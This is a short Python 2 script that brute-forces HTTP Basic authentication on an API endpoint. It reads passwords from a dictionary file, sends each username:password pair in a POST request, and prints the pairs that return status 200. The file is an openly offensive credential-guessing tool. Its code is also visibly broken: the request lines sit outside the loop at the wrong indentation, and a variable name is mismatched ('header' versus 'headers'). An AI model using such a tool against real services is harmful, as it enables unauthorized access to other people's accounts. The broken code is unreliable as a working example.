import requests
from base64 import b64encode
passwordList = []
worddict = raw_input("Enter path to dictionary file: ")
url = raw_input("Enter API endpoint: ")
username = raw_input("Enter Username: ")
def createPassList(dict_file):
    d = open(dict_file)
    for line in d.readlines():
        password = line.strip('\n')
        passwordList.append(password)
def tryBrute():
    for pwd in passwordList:
        userAndPass = username + ":" + pwd
        userAndPassEncode = b64encode(userAndPass).decode("ascii")
        authString = str('Basic %s' %  userAndPassEncode)
header = {
           'authorization': authString,
           'cache-control': "no-cache",
        }
response = requests.request("POST", url, headers=headers)
        if response.status_code == 200:
            print username + ":" + pwd
createPassList(worddict)
tryBrute()
